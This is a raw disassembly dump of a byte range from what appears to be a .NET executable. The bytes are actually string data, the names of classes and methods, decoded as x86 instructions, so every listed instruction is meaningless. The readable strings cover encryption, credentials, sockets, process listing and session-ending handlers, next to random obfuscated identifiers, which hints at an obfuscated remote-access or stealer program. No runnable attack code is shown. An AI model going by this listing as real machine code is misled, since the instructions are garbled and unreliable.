  409505:	74 65                	je     0x40956c
  409507:	67 65 72 00          	addr16 gs jb 0x40950b
  40950b:	73 65                	jae    0x409572
  40950d:	74 5f                	je     0x40956e
  40950f:	41                   	inc    %ecx
  409510:	73 49                	jae    0x40955b
  409512:	6e                   	outsb  %ds:(%esi),(%dx)
  409513:	74 65                	je     0x40957a
  409515:	67 65 72 00          	addr16 gs jb 0x409519
  409519:	4d                   	dec    %ebp
  40951a:	61                   	popa
  40951b:	6e                   	outsb  %ds:(%esi),(%dx)
  40951c:	61                   	popa
  40951d:	67 65 6d             	gs insl (%dx),%es:(%di)
  409520:	65 6e                	outsb  %gs:(%esi),(%dx)
  409522:	74 4f                	je     0x409573
  409524:	62 6a 65             	bound  %ebp,0x65(%edx)
  409527:	63 74 53 65          	arpl   %esi,0x65(%ebx,%edx,2)
  40952b:	61                   	popa
  40952c:	72 63                	jb     0x409591
  40952e:	68 65 72 00 53       	push   $0x53007265
  409533:	65 73 73             	gs jae 0x4095a9
  409536:	69 6f 6e 45 6e 64 69 	imul   $0x69646e45,0x6e(%edi),%ebp
  40953d:	6e                   	outsb  %ds:(%esi),(%dx)
  40953e:	67 45                	addr16 inc %ebp
  409540:	76 65                	jbe    0x4095a7
  409542:	6e                   	outsb  %ds:(%esi),(%dx)
  409543:	74 48                	je     0x40958d
  409545:	61                   	popa
  409546:	6e                   	outsb  %ds:(%esi),(%dx)
  409547:	64 6c                	fs insb (%dx),%es:(%edi)
  409549:	65 72 00             	gs jb  0x40954c
  40954c:	54                   	push   %esp
  40954d:	69 6d 65 72 00 54 6f 	imul   $0x6f540072,0x65(%ebp),%ebp
  409554:	55                   	push   %ebp
  409555:	70 70                	jo     0x4095c7
  409557:	65 72 00             	gs jb  0x40955a
  40955a:	43                   	inc    %ebx
  40955b:	75 72                	jne    0x4095cf
  40955d:	72 65                	jb     0x4095c4
  40955f:	6e                   	outsb  %ds:(%esi),(%dx)
  409560:	74 55                	je     0x4095b7
  409562:	73 65                	jae    0x4095c9
  409564:	72 00                	jb     0x409566
  409566:	53                   	push   %ebx
  409567:	74 72                	je     0x4095db
  409569:	65 61                	gs popa
  40956b:	6d                   	insl   (%dx),%es:(%edi)
  40956c:	57                   	push   %edi
  40956d:	72 69                	jb     0x4095d8
  40956f:	74 65                	je     0x4095d6
  409571:	72 00                	jb     0x409573
  409573:	54                   	push   %esp
  409574:	65 78 74             	gs js  0x4095eb
  409577:	57                   	push   %edi
  409578:	72 69                	jb     0x4095e3
  40957a:	74 65                	je     0x4095e1
  40957c:	72 00                	jb     0x40957e
  40957e:	45                   	inc    %ebp
  40957f:	6e                   	outsb  %ds:(%esi),(%dx)
  409580:	74 65                	je     0x4095e7
  409582:	72 00                	jb     0x409584
  409584:	42                   	inc    %edx
  409585:	69 74 43 6f 6e 76 65 	imul   $0x7265766e,0x6f(%ebx,%eax,2),%esi
  40958c:	72 
  40958d:	74 65                	je     0x4095f4
  40958f:	72 00                	jb     0x409591
  409591:	54                   	push   %esp
  409592:	6f                   	outsl  %ds:(%esi),(%dx)
  409593:	4c                   	dec    %esp
  409594:	6f                   	outsl  %ds:(%esi),(%dx)
  409595:	77 65                	ja     0x4095fc
  409597:	72 00                	jb     0x409599
  409599:	76 4d                	jbe    0x4095e8
  40959b:	6a 45                	push   $0x45
  40959d:	6b 68 68 52          	imul   $0x52,0x68(%eax),%ebp
  4095a1:	6d                   	insl   (%dx),%es:(%edi)
  4095a2:	65 6c                	gs insb (%dx),%es:(%edi)
  4095a4:	59                   	pop    %ecx
  4095a5:	47                   	inc    %edi
  4095a6:	52                   	push   %edx
  4095a7:	6b 72 00 49          	imul   $0x49,0x0(%edx),%esi
  4095ab:	45                   	inc    %ebp
  4095ac:	6e                   	outsb  %ds:(%esi),(%dx)
  4095ad:	75 6d                	jne    0x40961c
  4095af:	65 72 61             	gs jb  0x409613
  4095b2:	74 6f                	je     0x409623
  4095b4:	72 00                	jb     0x4095b6
  4095b6:	4d                   	dec    %ebp
  4095b7:	61                   	popa
  4095b8:	6e                   	outsb  %ds:(%esi),(%dx)
  4095b9:	61                   	popa
  4095ba:	67 65 6d             	gs insl (%dx),%es:(%di)
  4095bd:	65 6e                	outsb  %gs:(%esi),(%dx)
  4095bf:	74 4f                	je     0x409610
  4095c1:	62 6a 65             	bound  %ebp,0x65(%edx)
  4095c4:	63 74 45 6e          	arpl   %esi,0x6e(%ebp,%eax,2)
  4095c8:	75 6d                	jne    0x409637
  4095ca:	65 72 61             	gs jb  0x40962e
  4095cd:	74 6f                	je     0x40963e
  4095cf:	72 00                	jb     0x4095d1
  4095d1:	53                   	push   %ebx
  4095d2:	79 73                	jns    0x409647
  4095d4:	74 65                	je     0x40963b
  4095d6:	6d                   	insl   (%dx),%es:(%edi)
  4095d7:	2e 43                	cs inc %ebx
  4095d9:	6f                   	outsl  %ds:(%esi),(%dx)
  4095da:	6c                   	insb   (%dx),%es:(%edi)
  4095db:	6c                   	insb   (%dx),%es:(%edi)
  4095dc:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4095e1:	6e                   	outsb  %ds:(%esi),(%dx)
  4095e2:	73 2e                	jae    0x409612
  4095e4:	49                   	dec    %ecx
  4095e5:	45                   	inc    %ebp
  4095e6:	6e                   	outsb  %ds:(%esi),(%dx)
  4095e7:	75 6d                	jne    0x409656
  4095e9:	65 72 61             	gs jb  0x40964d
  4095ec:	62 6c 65 2e          	bound  %ebp,0x2e(%ebp,%eiz,2)
  4095f0:	47                   	inc    %edi
  4095f1:	65 74 45             	gs je  0x409639
  4095f4:	6e                   	outsb  %ds:(%esi),(%dx)
  4095f5:	75 6d                	jne    0x409664
  4095f7:	65 72 61             	gs jb  0x40965b
  4095fa:	74 6f                	je     0x40966b
  4095fc:	72 00                	jb     0x4095fe
  4095fe:	41                   	inc    %ecx
  4095ff:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  409603:	61                   	popa
  409604:	74 6f                	je     0x409675
  409606:	72 00                	jb     0x409608
  409608:	2e 63 74 6f 72       	arpl   %esi,%cs:0x72(%edi,%ebp,2)
  40960d:	00 2e                	add    %ch,(%esi)
  40960f:	63 63 74             	arpl   %esp,0x74(%ebx)
  409612:	6f                   	outsl  %ds:(%esi),(%dx)
  409613:	72 00                	jb     0x409615
  409615:	4d                   	dec    %ebp
  409616:	6f                   	outsl  %ds:(%esi),(%dx)
  409617:	6e                   	outsb  %ds:(%esi),(%dx)
  409618:	69 74 6f 72 00 43 72 	imul   $0x65724300,0x72(%edi,%ebp,2),%esi
  40961f:	65 
  409620:	61                   	popa
  409621:	74 65                	je     0x409688
  409623:	44                   	inc    %esp
  409624:	65 63 72 79          	arpl   %esi,%gs:0x79(%edx)
  409628:	70 74                	jo     0x40969e
  40962a:	6f                   	outsl  %ds:(%esi),(%dx)
  40962b:	72 00                	jb     0x40962d
  40962d:	43                   	inc    %ebx
  40962e:	72 65                	jb     0x409695
  409630:	61                   	popa
  409631:	74 65                	je     0x409698
  409633:	45                   	inc    %ebp
  409634:	6e                   	outsb  %ds:(%esi),(%dx)
  409635:	63 72 79             	arpl   %esi,0x79(%edx)
  409638:	70 74                	jo     0x4096ae
  40963a:	6f                   	outsl  %ds:(%esi),(%dx)
  40963b:	72 00                	jb     0x40963d
  40963d:	49                   	dec    %ecx
  40963e:	6e                   	outsb  %ds:(%esi),(%dx)
  40963f:	74 50                	je     0x409691
  409641:	74 72                	je     0x4096b5
  409643:	00 65 72             	add    %ah,0x72(%ebp)
  409646:	75 63                	jne    0x4096ab
  409648:	79 48                	jns    0x409692
  40964a:	54                   	push   %esp
  40964b:	6b 4f 43 43          	imul   $0x43,0x43(%edi),%ecx
  40964f:	73 00                	jae    0x409651
  409651:	4e                   	dec    %esi
  409652:	45                   	inc    %ebp
  409653:	77 6b                	ja     0x4096c0
  409655:	50                   	push   %eax
  409656:	75 48                	jne    0x4096a0
  409658:	67 53                	addr16 push %ebx
  40965a:	44                   	inc    %esp
  40965b:	73 00                	jae    0x40965d
  40965d:	6b 52 43 64          	imul   $0x64,0x43(%edx),%edx
  409661:	58                   	pop    %eax
  409662:	49                   	dec    %ecx
  409663:	5a                   	pop    %edx
  409664:	74 4d                	je     0x4096b3
  409666:	73 00                	jae    0x409668
  409668:	79 73                	jns    0x4096dd
  40966a:	64 43                	fs inc %ebx
  40966c:	74 45                	je     0x4096b3
  40966e:	54                   	push   %esp
  40966f:	61                   	popa
  409670:	49                   	dec    %ecx
  409671:	61                   	popa
  409672:	70 67                	jo     0x4096db
  409674:	72 4e                	jb     0x4096c4
  409676:	73 00                	jae    0x409678
  409678:	53                   	push   %ebx
  409679:	79 73                	jns    0x4096ee
  40967b:	74 65                	je     0x4096e2
  40967d:	6d                   	insl   (%dx),%es:(%edi)
  40967e:	2e 44                	cs inc %esp
  409680:	69 61 67 6e 6f 73 74 	imul   $0x74736f6e,0x67(%ecx),%esp
  409687:	69 63 73 00 4f 79 45 	imul   $0x45794f00,0x73(%ebx),%esp
  40968e:	5a                   	pop    %edx
  40968f:	5a                   	pop    %edx
  409690:	50                   	push   %eax
  409691:	58                   	pop    %eax
  409692:	6f                   	outsl  %ds:(%esi),(%dx)
  409693:	74 43                	je     0x4096d8
  409695:	65 73 00             	gs jae 0x409698
  409698:	4d                   	dec    %ebp
  409699:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  4096a0:	74 2e                	je     0x4096d0
  4096a2:	56                   	push   %esi
  4096a3:	69 73 75 61 6c 42 61 	imul   $0x61426c61,0x75(%ebx),%esi
  4096aa:	73 69                	jae    0x409715
  4096ac:	63 2e                	arpl   %ebp,(%esi)
  4096ae:	44                   	inc    %esp
  4096af:	65 76 69             	gs jbe 0x40971b
  4096b2:	63 65 73             	arpl   %esp,0x73(%ebp)
  4096b5:	00 53 79             	add    %dl,0x79(%ebx)
  4096b8:	73 74                	jae    0x40972e
  4096ba:	65 6d                	gs insl (%dx),%es:(%edi)
  4096bc:	2e 52                	cs push %edx
  4096be:	75 6e                	jne    0x40972e
  4096c0:	74 69                	je     0x40972b
  4096c2:	6d                   	insl   (%dx),%es:(%edi)
  4096c3:	65 2e 49             	gs cs dec %ecx
  4096c6:	6e                   	outsb  %ds:(%esi),(%dx)
  4096c7:	74 65                	je     0x40972e
  4096c9:	72 6f                	jb     0x40973a
  4096cb:	70 53                	jo     0x409720
  4096cd:	65 72 76             	gs jb  0x409746
  4096d0:	69 63 65 73 00 53 79 	imul   $0x79530073,0x65(%ebx),%esp
  4096d7:	73 74                	jae    0x40974d
  4096d9:	65 6d                	gs insl (%dx),%es:(%edi)
  4096db:	2e 52                	cs push %edx
  4096dd:	75 6e                	jne    0x40974d
  4096df:	74 69                	je     0x40974a
  4096e1:	6d                   	insl   (%dx),%es:(%edi)
  4096e2:	65 2e 43             	gs cs inc %ebx
  4096e5:	6f                   	outsl  %ds:(%esi),(%dx)
  4096e6:	6d                   	insl   (%dx),%es:(%edi)
  4096e7:	70 69                	jo     0x409752
  4096e9:	6c                   	insb   (%dx),%es:(%edi)
  4096ea:	65 72 53             	gs jb  0x409740
  4096ed:	65 72 76             	gs jb  0x409766
  4096f0:	69 63 65 73 00 44 65 	imul   $0x65440073,0x65(%ebx),%esp
  4096f7:	62 75 67             	bound  %esi,0x67(%ebp)
  4096fa:	67 69 6e 67 4d 6f 64 	imul   $0x65646f4d,0x67(%bp),%ebp
  409701:	65 
  409702:	73 00                	jae    0x409704
  409704:	45                   	inc    %ebp
  409705:	78 70                	js     0x409777
  409707:	61                   	popa
  409708:	6e                   	outsb  %ds:(%esi),(%dx)
  409709:	64 45                	fs inc %ebp
  40970b:	6e                   	outsb  %ds:(%esi),(%dx)
  40970c:	76 69                	jbe    0x409777
  40970e:	72 6f                	jb     0x40977f
  409710:	6e                   	outsb  %ds:(%esi),(%dx)
  409711:	6d                   	insl   (%dx),%es:(%edi)
  409712:	65 6e                	outsb  %gs:(%esi),(%dx)
  409714:	74 56                	je     0x40976c
  409716:	61                   	popa
  409717:	72 69                	jb     0x409782
  409719:	61                   	popa
  40971a:	62 6c 65 73          	bound  %ebp,0x73(%ebp,%eiz,2)
  40971e:	00 47 65             	add    %al,0x65(%edi)
  409721:	74 50                	je     0x409773
  409723:	72 6f                	jb     0x409794
  409725:	63 65 73             	arpl   %esp,0x73(%ebp)
  409728:	73 65                	jae    0x40978f
  40972a:	73 00                	jae    0x40972c
  40972c:	47                   	inc    %edi
  40972d:	65 74 48             	gs je  0x409778
  409730:	6f                   	outsl  %ds:(%esi),(%dx)
  409731:	73 74                	jae    0x4097a7
  409733:	41                   	inc    %ecx
  409734:	64 64 72 65          	fs fs jb 0x40979d
  409738:	73 73                	jae    0x4097ad
  40973a:	65 73 00             	gs jae 0x40973d
  40973d:	53                   	push   %ebx
  40973e:	79 73                	jns    0x4097b3
  409740:	74 65                	je     0x4097a7
  409742:	6d                   	insl   (%dx),%es:(%edi)
  409743:	2e 53                	cs push %ebx
  409745:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  409749:	69 74 79 2e 43 72 79 	imul   $0x70797243,0x2e(%ecx,%edi,2),%esi
  409750:	70 
  409751:	74 6f                	je     0x4097c2
  409753:	67 72 61             	addr16 jb 0x4097b7
  409756:	70 68                	jo     0x4097c0
  409758:	79 2e                	jns    0x409788
  40975a:	58                   	pop    %eax
  40975b:	35 30 39 43 65       	xor    $0x65433930,%eax
  409760:	72 74                	jb     0x4097d6
  409762:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  409769:	73 00                	jae    0x40976b
  40976b:	52                   	push   %edx
  40976c:	66 63 32             	arpl   %si,(%edx)
  40976f:	38 39                	cmp    %bh,(%ecx)
  409771:	38 44 65 72          	cmp    %al,0x72(%ebp,%eiz,2)
  409775:	69 76 65 42 79 74 65 	imul   $0x65747942,0x65(%esi),%esi
  40977c:	73 00                	jae    0x40977e
  40977e:	52                   	push   %edx
  40977f:	65 61                	gs popa
  409781:	64 41                	fs inc %ecx
  409783:	6c                   	insb   (%dx),%es:(%edi)
  409784:	6c                   	insb   (%dx),%es:(%edi)
  409785:	42                   	inc    %edx
  409786:	79 74                	jns    0x4097fc
  409788:	65 73 00             	gs jae 0x40978b
  40978b:	47                   	inc    %edi
  40978c:	65 74 42             	gs je  0x4097d1
  40978f:	79 74                	jns    0x409805
  409791:	65 73 00             	gs jae 0x409794
  409794:	43                   	inc    %ebx
  409795:	53                   	push   %ebx
  409796:	68 61 72 70 41       	push   $0x41707261
  40979b:	72 67                	jb     0x409804
  40979d:	75 6d                	jne    0x40980c
  40979f:	65 6e                	outsb  %gs:(%esi),(%dx)
  4097a1:	74 49                	je     0x4097ec
  4097a3:	6e                   	outsb  %ds:(%esi),(%dx)
  4097a4:	66 6f                	outsw  %ds:(%esi),(%dx)
  4097a6:	46                   	inc    %esi
  4097a7:	6c                   	insb   (%dx),%es:(%edi)
  4097a8:	61                   	popa
  4097a9:	67 73 00             	addr16 jae 0x4097ac
  4097ac:	43                   	inc    %ebx
  4097ad:	53                   	push   %ebx
  4097ae:	68 61 72 70 42       	push   $0x42707261
  4097b3:	69 6e 64 65 72 46 6c 	imul   $0x6c467265,0x64(%esi),%ebp
  4097ba:	61                   	popa
  4097bb:	67 73 00             	addr16 jae 0x4097be
  4097be:	53                   	push   %ebx
  4097bf:	74 72                	je     0x409833
  4097c1:	69 6e 67 73 00 53 65 	imul   $0x65530073,0x67(%esi),%ebp
  4097c8:	73 73                	jae    0x40983d
  4097ca:	69 6f 6e 45 6e 64 69 	imul   $0x69646e45,0x6e(%edi),%ebp
  4097d1:	6e                   	outsb  %ds:(%esi),(%dx)
  4097d2:	67 45                	addr16 inc %ebp
  4097d4:	76 65                	jbe    0x40983b
  4097d6:	6e                   	outsb  %ds:(%esi),(%dx)
  4097d7:	74 41                	je     0x40981a
  4097d9:	72 67                	jb     0x409842
  4097db:	73 00                	jae    0x4097dd
  4097dd:	76 4b                	jbe    0x40982a
  4097df:	6c                   	insb   (%dx),%es:(%edi)
  4097e0:	42                   	inc    %edx
  4097e1:	46                   	inc    %esi
  4097e2:	71 63                	jno    0x409847
  4097e4:	58                   	pop    %eax
  4097e5:	64 78 63             	fs js  0x40984b
  4097e8:	47                   	inc    %edi
  4097e9:	77 6a                	ja     0x409855
  4097eb:	73 00                	jae    0x4097ed
  4097ed:	62 62 6c             	bound  %esp,0x6c(%edx)
  4097f0:	4e                   	dec    %esi
  4097f1:	64 69 47 6f 6d 77 6a 	imul   $0x736a776d,%fs:0x6f(%edi),%eax
  4097f8:	73 
  4097f9:	00 49 43             	add    %cl,0x43(%ecx)
  4097fc:	72 65                	jb     0x409863
  4097fe:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  409801:	74 69                	je     0x40986c
  409803:	61                   	popa
  409804:	6c                   	insb   (%dx),%es:(%edi)
  409805:	73 00                	jae    0x409807
  409807:	73 65                	jae    0x40986e
  409809:	74 5f                	je     0x40986a
  40980b:	43                   	inc    %ebx
  40980c:	72 65                	jb     0x409873
  40980e:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  409811:	74 69                	je     0x40987c
  409813:	61                   	popa
  409814:	6c                   	insb   (%dx),%es:(%edi)
  409815:	73 00                	jae    0x409817
  409817:	45                   	inc    %ebp
  409818:	71 75                	jno    0x40988f
  40981a:	61                   	popa
  40981b:	6c                   	insb   (%dx),%es:(%edi)
  40981c:	73 00                	jae    0x40981e
  40981e:	53                   	push   %ebx
  40981f:	73 6c                	jae    0x40988d
  409821:	50                   	push   %eax
  409822:	72 6f                	jb     0x409893
  409824:	74 6f                	je     0x409895
  409826:	63 6f 6c             	arpl   %ebp,0x6c(%edi)
  409829:	73 00                	jae    0x40982b
  40982b:	53                   	push   %ebx
  40982c:	79 73                	jns    0x4098a1
  40982e:	74 65                	je     0x409895
  409830:	6d                   	insl   (%dx),%es:(%edi)
  409831:	2e 57                	cs push %edi
  409833:	69 6e 64 6f 77 73 2e 	imul   $0x2e73776f,0x64(%esi),%ebp
  40983a:	46                   	inc    %esi
  40983b:	6f                   	outsl  %ds:(%esi),(%dx)
  40983c:	72 6d                	jb     0x4098ab
  40983e:	73 00                	jae    0x409840
  409840:	44                   	inc    %esp
  409841:	6e                   	outsb  %ds:(%esi),(%dx)
  409842:	73 00                	jae    0x409844
  409844:	43                   	inc    %ebx
  409845:	6f                   	outsl  %ds:(%esi),(%dx)
  409846:	6e                   	outsb  %ds:(%esi),(%dx)
  409847:	74 61                	je     0x4098aa
  409849:	69 6e 73 00 53 79 73 	imul   $0x73795300,0x73(%esi),%ebp
  409850:	74 65                	je     0x4098b7
  409852:	6d                   	insl   (%dx),%es:(%edi)
  409853:	2e 43                	cs inc %ebx
  409855:	6f                   	outsl  %ds:(%esi),(%dx)
  409856:	6c                   	insb   (%dx),%es:(%edi)
  409857:	6c                   	insb   (%dx),%es:(%edi)
  409858:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  40985d:	6e                   	outsb  %ds:(%esi),(%dx)
  40985e:	73 00                	jae    0x409860
  409860:	53                   	push   %ebx
  409861:	74 72                	je     0x4098d5
  409863:	69 6e 67 53 70 6c 69 	imul   $0x696c7053,0x67(%esi),%ebp
  40986a:	74 4f                	je     0x4098bb
  40986c:	70 74                	jo     0x4098e2
  40986e:	69 6f 6e 73 00 47 65 	imul   $0x65470073,0x6e(%edi),%ebp
  409875:	74 49                	je     0x4098c0
  409877:	6d                   	insl   (%dx),%es:(%edi)
  409878:	61                   	popa
  409879:	67 65 44             	addr16 gs inc %esp
  40987c:	65 63 6f 64          	arpl   %ebp,%gs:0x64(%edi)
  409880:	65 72 73             	gs jb  0x4098f6
  409883:	00 52 75             	add    %dl,0x75(%edx)
  409886:	6e                   	outsb  %ds:(%esi),(%dx)
  409887:	74 69                	je     0x4098f2
  409889:	6d                   	insl   (%dx),%es:(%edi)
  40988a:	65 48                	gs dec %eax
  40988c:	65 6c                	gs insb (%dx),%es:(%edi)
  40988e:	70 65                	jo     0x4098f5
  409890:	72 73                	jb     0x409905
  409892:	00 53 73             	add    %dl,0x73(%ebx)
  409895:	6c                   	insb   (%dx),%es:(%edi)
  409896:	50                   	push   %eax
  409897:	6f                   	outsl  %ds:(%esi),(%dx)
  409898:	6c                   	insb   (%dx),%es:(%edi)
  409899:	69 63 79 45 72 72 6f 	imul   $0x6f727245,0x79(%ebx),%esp
  4098a0:	72 73                	jb     0x409915
  4098a2:	00 46 69             	add    %al,0x69(%esi)
  4098a5:	6c                   	insb   (%dx),%es:(%edi)
  4098a6:	65 41                	gs inc %ecx
  4098a8:	63 63 65             	arpl   %esp,0x65(%ebx)
  4098ab:	73 73                	jae    0x409920
  4098ad:	00 47 65             	add    %al,0x65(%edi)
  4098b0:	74 43                	je     0x4098f5
  4098b2:	75 72                	jne    0x409926
  4098b4:	72 65                	jb     0x40991b
  4098b6:	6e                   	outsb  %ds:(%esi),(%dx)
  4098b7:	74 50                	je     0x409909
  4098b9:	72 6f                	jb     0x40992a
  4098bb:	63 65 73             	arpl   %esp,0x73(%ebp)
  4098be:	73 00                	jae    0x4098c0
  4098c0:	49                   	dec    %ecx
  4098c1:	50                   	push   %eax
  4098c2:	41                   	inc    %ecx
  4098c3:	64 64 72 65          	fs fs jb 0x40992c
  4098c7:	73 73                	jae    0x40993c
  4098c9:	00 53 79             	add    %dl,0x79(%ebx)
  4098cc:	73 74                	jae    0x409942
  4098ce:	65 6d                	gs insl (%dx),%es:(%edi)
  4098d0:	2e 4e                	cs dec %esi
  4098d2:	65 74 2e             	gs je  0x409903
  4098d5:	53                   	push   %ebx
  4098d6:	6f                   	outsl  %ds:(%esi),(%dx)
  4098d7:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  4098da:	74 73                	je     0x40994f
  4098dc:	00 73 65             	add    %dh,0x65(%ebx)
  4098df:	74 5f                	je     0x409940
  4098e1:	41                   	inc    %ecx
  4098e2:	72 67                	jb     0x40994b
  4098e4:	75 6d                	jne    0x409953
  4098e6:	65 6e                	outsb  %gs:(%esi),(%dx)
  4098e8:	74 73                	je     0x40995d
  4098ea:	00 53 79             	add    %dl,0x79(%ebx)
  4098ed:	73 74                	jae    0x409963
  4098ef:	65 6d                	gs insl (%dx),%es:(%edi)
  4098f1:	45                   	inc    %ebp
  4098f2:	76 65                	jbe    0x409959
  4098f4:	6e                   	outsb  %ds:(%esi),(%dx)
  4098f5:	74 73                	je     0x40996a
  4098f7:	00 45 78             	add    %al,0x78(%ebp)
  4098fa:	69 73 74 73 00 70 75 	imul   $0x75700073,0x74(%ebx),%esi
  409901:	4c                   	dec    %esp
  409902:	4e                   	dec    %esi
  409903:	4a                   	dec    %edx
  409904:	58                   	pop    %eax
  409905:	6c                   	insb   (%dx),%es:(%edi)
  409906:	4d                   	dec    %ebp
  409907:	77 6f                	ja     0x409978
  409909:	56                   	push   %esi
  40990a:	75 4a                	jne    0x409956
  40990c:	44                   	inc    %esp
  40990d:	42                   	inc    %edx
  40990e:	74 00                	je     0x409910
  409910:	71 71                	jno    0x409983
  409912:	50                   	push   %eax
  409913:	7a 63                	jp     0x409978
  409915:	48                   	dec    %eax
  409916:	69 62 73 4f 74 00 65 	imul   $0x6500744f,0x73(%edx),%esp
  40991d:	59                   	pop    %ecx
  40991e:	61                   	popa
  40991f:	47                   	inc    %edi
  409920:	59                   	pop    %ecx
  409921:	4b                   	dec    %ebx
  409922:	72 4e                	jb     0x409972
  409924:	73 4b                	jae    0x409971
  409926:	57                   	push   %edi
  409927:	6f                   	outsl  %ds:(%esi),(%dx)
  409928:	75 62                	jne    0x40998c
  40992a:	55                   	push   %ebp
  40992b:	74 00                	je     0x40992d
  40992d:	43                   	inc    %ebx
  40992e:	6f                   	outsl  %ds:(%esi),(%dx)
  40992f:	6e                   	outsb  %ds:(%esi),(%dx)
  409930:	63 61 74             	arpl   %esp,0x74(%ecx)
  409933:	00 49 6d             	add    %cl,0x6d(%ecx)
  409936:	61                   	popa
  409937:	67 65 46             	addr16 gs inc %esi
  40993a:	6f                   	outsl  %ds:(%esi),(%dx)
  40993b:	72 6d                	jb     0x4099aa
  40993d:	61                   	popa
  40993e:	74 00                	je     0x409940
  409940:	67 65 74 5f          	addr16 gs je 0x4099a3
  409944:	41                   	inc    %ecx
  409945:	73 46                	jae    0x40998d
  409947:	6c                   	insb   (%dx),%es:(%edi)
  409948:	6f                   	outsl  %ds:(%esi),(%dx)
  409949:	61                   	popa
  40994a:	74 00                	je     0x40994c
  40994c:	73 65                	jae    0x4099b3
  40994e:	74 5f                	je     0x4099af
  409950:	41                   	inc    %ecx
  409951:	73 46                	jae    0x409999
  409953:	6c                   	insb   (%dx),%es:(%edi)
  409954:	6f                   	outsl  %ds:(%esi),(%dx)
  409955:	61                   	popa
  409956:	74 00                	je     0x409958
  409958:	4d                   	dec    %ebp
  409959:	61                   	popa
  40995a:	6e                   	outsb  %ds:(%esi),(%dx)
  40995b:	61                   	popa
  40995c:	67 65 6d             	gs insl (%dx),%es:(%di)
  40995f:	65 6e                	outsb  %gs:(%esi),(%dx)
  409961:	74 42                	je     0x4099a5
  409963:	61                   	popa
  409964:	73 65                	jae    0x4099cb
  409966:	4f                   	dec    %edi
  409967:	62 6a 65             	bound  %ebp,0x65(%edx)
  40996a:	63 74 00 43          	arpl   %esi,0x43(%eax,%eax,1)
  40996e:	6f                   	outsl  %ds:(%esi),(%dx)
  40996f:	6c                   	insb   (%dx),%es:(%edi)
  409970:	6c                   	insb   (%dx),%es:(%edi)
  409971:	65 63 74 00 43       	arpl   %esi,%gs:0x43(%eax,%eax,1)
  409976:	6f                   	outsl  %ds:(%esi),(%dx)
  409977:	6e                   	outsb  %ds:(%esi),(%dx)
  409978:	6e                   	outsb  %ds:(%esi),(%dx)
  409979:	65 63 74 00 47       	arpl   %esi,%gs:0x47(%eax,%eax,1)
  40997e:	65 74 00             	gs je  0x409981
  409981:	53                   	push   %ebx
  409982:	79 73                	jns    0x4099f7
  409984:	74 65                	je     0x4099eb
  409986:	6d                   	insl   (%dx),%es:(%edi)
  409987:	2e 4e                	cs dec %esi
  409989:	65 74 00             	gs je  0x40998c
  40998c:	54                   	push   %esp
  40998d:	61                   	popa
  40998e:	72 67                	jb     0x4099f7
  409990:	65 74 00             	gs je  0x409993
  409993:	53                   	push   %ebx
  409994:	6f                   	outsl  %ds:(%esi),(%dx)
  409995:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  409998:	74 00                	je     0x40999a
  40999a:	53                   	push   %ebx
  40999b:	79 73                	jns    0x409a10
  40999d:	74 65                	je     0x409a04
  40999f:	6d                   	insl   (%dx),%es:(%edi)
  4099a0:	2e 43                	cs inc %ebx
  4099a2:	6f                   	outsl  %ds:(%esi),(%dx)
  4099a3:	6c                   	insb   (%dx),%es:(%edi)
  4099a4:	6c                   	insb   (%dx),%es:(%edi)
  4099a5:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4099aa:	6e                   	outsb  %ds:(%esi),(%dx)
  4099ab:	73 2e                	jae    0x4099db
  4099ad:	49                   	dec    %ecx
  4099ae:	45                   	inc    %ebp
  4099af:	6e                   	outsb  %ds:(%esi),(%dx)
  4099b0:	75 6d                	jne    0x409a1f
  4099b2:	65 72 61             	gs jb  0x409a16
  4099b5:	74 6f                	je     0x409a26
  4099b7:	72 2e                	jb     0x4099e7
  4099b9:	52                   	push   %edx
  4099ba:	65 73 65             	gs jae 0x409a22
  4099bd:	74 00                	je     0x4099bf
  4099bf:	67 65 74 5f          	addr16 gs je 0x409a22
  4099c3:	4f                   	dec    %edi
  4099c4:	66 66 73 65          	data16 data16 jae 0x409a2d
  4099c8:	74 00                	je     0x4099ca
  4099ca:	73 65                	jae    0x409a31
  4099cc:	74 5f                	je     0x409a2d
  4099ce:	4f                   	dec    %edi
  4099cf:	66 66 73 65          	data16 data16 jae 0x409a38
  4099d3:	74 00                	je     0x4099d5
  4099d5:	53                   	push   %ebx
  4099d6:	70 6c                	jo     0x409a44
  4099d8:	69 74 00 45 78 69 74 	imul   $0x746978,0x45(%eax,%eax,1),%esi
  4099df:	00 
  4099e0:	6a 4d                	push   $0x4d
  4099e2:	61                   	popa
  4099e3:	4c                   	dec    %esp
  4099e4:	42                   	inc    %edx
  4099e5:	61                   	popa
  4099e6:	61                   	popa
  4099e7:	51                   	push   %ecx
  4099e8:	55                   	push   %ebp
  4099e9:	6c                   	insb   (%dx),%es:(%edi)
  4099ea:	74 00                	je     0x4099ec
  4099ec:	49                   	dec    %ecx
  4099ed:	41                   	inc    %ecx
  4099ee:	73 79                	jae    0x409a69
  4099f0:	6e                   	outsb  %ds:(%esi),(%dx)
  4099f1:	63 52 65             	arpl   %edx,0x65(%edx)
  4099f4:	73 75                	jae    0x409a6b
  4099f6:	6c                   	insb   (%dx),%es:(%edi)
  4099f7:	74 00                	je     0x4099f9
  4099f9:	54                   	push   %esp
  4099fa:	6f                   	outsl  %ds:(%esi),(%dx)
  4099fb:	55                   	push   %ebp
  4099fc:	70 70                	jo     0x409a6e
  4099fe:	65 72 49             	gs jb  0x409a4a
  409a01:	6e                   	outsb  %ds:(%esi),(%dx)
  409a02:	76 61                	jbe    0x409a65
  409a04:	72 69                	jb     0x409a6f
  409a06:	61                   	popa
  409a07:	6e                   	outsb  %ds:(%esi),(%dx)
  409a08:	74 00                	je     0x409a0a
  409a0a:	57                   	push   %edi
  409a0b:	65 62 43 6c          	bound  %eax,%gs:0x6c(%ebx)
  409a0f:	69 65 6e 74 00 67 65 	imul   $0x65670074,0x6e(%ebp),%esp
  409a16:	74 5f                	je     0x409a77
  409a18:	53                   	push   %ebx
